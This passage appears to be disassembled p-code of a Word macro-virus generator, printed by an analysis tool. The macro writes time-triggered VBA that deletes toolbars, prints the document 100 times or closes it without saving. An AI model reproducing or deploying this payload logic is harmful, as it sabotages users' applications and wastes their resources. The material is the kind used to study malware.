' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #273:
' 	ElseBlock 
' Line #274:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #276:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #277:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #278:
' 	ElseBlock 
' Line #279:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #280:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #281:
' 	EndIfBlock 
' Line #282:
' 	EndIfBlock 
' Line #283:
' 	EndIfBlock 
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	EndIfBlock 
' Line #286:
' 	EndIfBlock 
' Line #287:
' 	EndIfBlock 
' Line #288:
' 	LitDI2 0x0032 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #289:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #290:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x0010 "Minute(Now()) = "
' 	Concat 
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #291:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #292:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #293:
' 	ElseBlock 
' Line #294:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #295:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #296:
' 	ElseBlock 
' Line #297:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #298:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #299:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #300:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #301:
' 	EndIfBlock 
' Line #302:
' 	EndIfBlock 
' Line #303:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #304:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #305:
' 	ElseBlock 
' Line #306:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #307:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #308:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #309:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #310:
' 	ElseBlock 
' Line #311:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #312:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #313:
' 	EndIfBlock 
' Line #314:
' 	EndIfBlock 
' Line #315:
' 	EndIfBlock 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	EndIfBlock 
' Line #318:
' 	LitDI2 0x0038 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #319:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #320:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #321:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #322:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #323:
' 	ElseBlock 
' Line #324:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #325:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #326:
' 	ElseBlock 
' Line #327:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #328:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #329:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #330:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #331:
' 	EndIfBlock 
' Line #332:
' 	EndIfBlock 
' Line #333:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #334:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #335:
' 	ElseBlock 
' Line #336:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #337:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #338:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #339:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #340:
' 	ElseBlock 
' Line #341:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #342:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #343:
' 	EndIfBlock 
' Line #344:
' 	EndIfBlock 
' Line #345:
' 	EndIfBlock 
' Line #346:
' 	EndIfBlock 
' Line #347:
' 	EndIfBlock 
' Line #348:
' 	LitDI2 0x003B 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #349:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #350:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #351:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #352:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #353:
' 	ElseBlock 
' Line #354:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #355:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #356:
' 	ElseBlock 
' Line #357:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #358:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #359:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #360:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #361:
' 	EndIfBlock 
' Line #362:
' 	EndIfBlock 
' Line #363:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #364:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Asc 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #365:
' 	ElseBlock 
' Line #366:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #367:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #368:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #369:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #370:
' 	ElseBlock 
' Line #371:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #372:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #373:
' 	EndIfBlock 
' Line #374:
' 	EndIfBlock 
' Line #375:
' 	EndIfBlock 
' Line #376:
' 	EndIfBlock 
' Line #377:
' 	EndIfBlock 
' Line #378:
' 	LitDI2 0x003C 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #379:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #380:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #381:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #382:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #383:
' 	ElseBlock 
' Line #384:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #385:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #386:
' 	ElseBlock 
' Line #387:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #388:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #389:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	EndIfBlock 
' Line #393:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #394:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #395:
' 	ElseBlock 
' Line #396:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #397:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #398:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #399:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #400:
' 	ElseBlock 
' Line #401:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #402:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #403:
' 	EndIfBlock 
' Line #404:
' 	EndIfBlock 
' Line #405:
' 	EndIfBlock 
' Line #406:
' 	EndIfBlock 
' Line #407:
' 	EndIfBlock 
' Line #408:
' 	LitDI2 0x0043 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #409:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #410:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Minute(Now()) = "
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #411:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #412:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #413:
' 	ElseBlock 
' Line #414:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #415:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #416:
' 	ElseBlock 
' Line #417:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #418:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #419:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #420:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #421:
' 	EndIfBlock 
' Line #422:
' 	EndIfBlock 
' Line #423:
' 	EndIfBlock 
' Line #424:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #425:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #426:
' 	ElseBlock 
' Line #427:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #428:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #429:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #430:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #431:
' 	ElseBlock 
' Line #432:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #433:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #434:
' 	EndIfBlock 
' Line #435:
' 	EndIfBlock 
' Line #436:
' 	EndIfBlock 
' Line #437:
' 	EndIfBlock 
' Line #438:
' 	LitDI2 0x0045 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #439:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #440:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "If Hour(Now()) = "
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #441:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #442:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #443:
' 	ElseBlock 
' Line #444:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #445:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #446:
' 	ElseBlock 
' Line #447:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #448:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #449:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #450:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #451:
' 	EndIfBlock 
' Line #452:
' 	EndIfBlock 
' Line #453:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #454:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #455:
' 	ElseBlock 
' Line #456:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #457:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #458:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #459:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #460:
' 	ElseBlock 
' Line #461:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #462:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #463:
' 	EndIfBlock 
' Line #464:
' 	EndIfBlock 
' Line #465:
' 	EndIfBlock 
' Line #466:
' 	EndIfBlock 
' Line #467:
' 	EndIfBlock 
' Line #468:
' 	LitDI2 0x004B 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #469:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #470:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Minute(Now()) = "
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #471:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #472:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #473:
' 	ElseBlock 
' Line #474:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #475:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #476:
' 	ElseBlock 
' Line #477:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #478:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #479:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #480:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #481:
' 	EndIfBlock 
' Line #482:
' 	EndIfBlock 
' Line #483:
' 	EndIfBlock 
' Line #484:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #485:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #486:
' 	ElseBlock 
' Line #487:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #488:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #489:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #490:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #491:
' 	ElseBlock 
' Line #492:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #493:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #494:
' 	EndIfBlock 
' Line #495:
' 	EndIfBlock 
' Line #496:
' 	EndIfBlock 
' Line #497:
' 	EndIfBlock 
' Line #498:
' 	LitDI2 0x0050 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #499:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #500:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Minute(Now()) = "
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000E "Hour(Now()) = "
' 	Concat 
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #501:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #502:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #503:
' 	ElseBlock 
' Line #504:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #505:
' 	LitDI2 0x0001 
' 	Sharp 
